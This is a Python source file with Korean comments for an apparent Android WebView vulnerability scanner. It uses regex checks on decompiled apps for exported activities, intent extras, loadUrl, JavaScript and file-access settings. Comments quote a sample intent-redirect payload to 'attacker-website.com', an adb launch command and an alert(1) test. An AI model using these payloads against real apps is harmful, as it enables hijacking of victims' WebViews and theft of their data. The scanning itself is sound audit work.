import re
import os
import xml.etree.ElementTree as ET


class WebviewAnalyzer:

    def __init__(self):
        self.java_dir = 'java_src'
        #xml에서 view관련 액티비티, export=true인지 확인
        #activity줄에서 webview가 있는지 확인
        self.activity_pattern = re.compile(r'activity[^<>]*exported="true"[^<>]*/>',re.IGNORECASE)# webview라고 안 적혀있을 수도
#testFragment
#파일 내용으로 webview가 포함되어있는지, 찾은 경우 해당 파일 이름 반환


        #adb shell am start -n 앱 패키지/activity명 --es key value
        self.getExtra_pattern=re.compile(r"get[^()]*Extra",re.IGNORECASE)#getExtras와 getStringExtra 저 옵션을 쓰려면 intent와 함께 이 조건을 충족해야함.
        #self.intent_pattern=re.compile(r"Intent",re.IGNORECASE)

        #파일 로드 혹은 url로드
        self.url_pattern1=re.compile(r"http://",re.IGNORECASE)
        self.url_pattern2=re.compile(r"https://",re.IGNORECASE)
        self.uri_pattern=re.compile(r"file://",re.IGNORECASE)

        self.loadUrl_pattern=re.compile(r"loadUrl",re.IGNORECASE)
        self.putExtra_pattern=re.compile(r"put[^()]*Extra",re.IGNORECASE) #intent.putExtra("key","value")
        #file
        self.loadData_pattern=re.compile(r"loadData[^)]*text/html",re.IGNORECASE) #임의의 text/html, 보통 if else로 loadurl과 같이 있음.
        self.loadDataWithBaseURL_pattern=re.compile(r"loadDataWithBaseURL",re.IGNORECASE) #임의의 text/html, 보통 if else로 loadurl과 같이 있음.
        #Redirect within WebViewlocation.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end";
        self.shouldOverrideUrlLoading_pattern=re.compile(r'shouldOverrideUrlLoading',re.IGNORECASE) #url리다이렉트 

        #enabledjs=> 위 adb명령어와 함께 사용
        #self.javascript_pattern=re.compile(r'javascript',re.IGNORECASE) #인자로 javascript:가 들어간 경우/ @JavascriptInterface ->setjavascriptenabled는 @javascriptinterface를 사용해야함 근데 @JavascriptInterface는 아님.
        self.setjavascriptenabled_pattern=re.compile(r'setjavascriptenabled',re.IGNORECASE) 
        self.addJavascriptInterface_pattern=re.compile(r'addJavascriptInterface',re.IGNORECASE) #javascriptinterface를 사용해야함. android 4.2이상에서는 기본 비활성화
        
        #file 외부 접근 가능
        self.setAllowFileAccessFromFileURLs_pattern=re.compile(r'setAllowFileAccessFromFileURLs(true)',re.IGNORECASE) #Android Jelly Bean 4.~이상에서는 기본비활성화
        self.allowuniversalaccess_pattern=re.compile(r'setAllowUniversalAccessFromFileURLs(true)',re.IGNORECASE) #외부 소스에서 로컬 파일에 액세스 가능. adb shell ~~http대신 file:// 가능
        self.setallowFileaccess_pattern=re.compile(r'setAllowFileAccess',re.IGNORECASE) #file://data/data/com.package.name/app_webview 접근 가능. android 10이상에서는 비활성화, 일단 있으면 가능성있음. 9버전 있으니까!
        self.setAllowContentAccess_pattern=re.compile(r'setAllowContentAccess',re.IGNORECASE) #content://data/data/com.package.name/app_webview 접근 가능. android 10이상에서는 비활성화, 일단 있으면 가능성있음. 9버전 있으니까!
    #manifest
        
    def exported_activity(self, content):#and
        #activity<> 안에서 webview와 name=true가 공존하는지 확인
        #webwiew가 있는 activity인지 확인. 그러면 exported true인 것만 뽑아서 activity에서 webview 검사
        matches=[]
        matches=self.activity_pattern.findall(content)
        if matches:
            patterns=re.compile(r'android:name="([^"]*)"',re.IGNORECASE)
            name_extract=patterns.search(matches[0])
            name_string = name_extract.group(1)
            return name_string

    def analyze_activity(self, activity):
        try:
            with open(activity, 'r', encoding='utf-8') as file:
                sources = file.read()
                webview_results=[]
                #intent인자
                intent_exist= self.getExtra_pattern.findall(sources) or self.putExtra_pattern.findall(sources)

                #urlredirect 가능한 함수 adb shell am start -n 앱 패키지/activity명 --es key url
                loadUrlmatches=self.loadUrl_pattern.findall(sources) or self.loadData_pattern.findall(sources) or self.loadDataWithBaseURL_pattern.findall(sources) or self.shouldOverrideUrlLoading_pattern.findall(sources)

                #fileaccess 가능한 함수
                fileaccessmatches=self.setAllowFileAccessFromFileURLs_pattern.findall(sources) or self.allowuniversalaccess_pattern.findall(sources) or self.setallowFileaccess_pattern.findall(sources)
                
                webviewmatches=loadUrlmatches and intent_exist 

                #javascript enabled된 함수-추가요소(javascript://.com/alert(1)
                enabledjsvuln=webviewmatches and self.setjavascriptenabled_pattern.findall(sources)

                #fileload 가능한 함수-추가요소(file://l.html)
                fileaccessvuln_exist=loadUrlmatches and enabledjsvuln and fileaccessmatches

                print(f"webvievuln_exist {webviewmatches}, enabledjsvuln {enabledjsvuln}, fileaccessvuln {fileaccessvuln_exist}")
                webview_results.append(webviewmatches)
                webview_results.append(enabledjsvuln)
                webview_results.append(fileaccessvuln_exist)
                print(f"webview_results {webview_results}")
                return webviewmatches, enabledjsvuln, fileaccessvuln_exist

        except UnicodeDecodeError:
            return False
        
    def run(self,content):
        name_string=self.exported_activity(content)
        activity_path=""
        path=""
        whole_path=""
        if "<manifest" in content and name_string is not None:
            activity_path=name_string.replace('.','/')+".java"
            path=os.path.dirname(name_string)
            package=content.split("package=")[1].split('"')[1] #xml 파싱 모듈
            whole_path = f"{os.getcwd()}/java_src/{package}/sources/{activity_path}"
            #print(f"Whole_path {Whole_path}")
            if f"{path}" in content:
                #print(f"activity_path {activity_path}")
                #print(name_string)
                return name_string, self.analyze_activity(whole_path)
            else:
                print("no webview activity found")
        else:
            pass


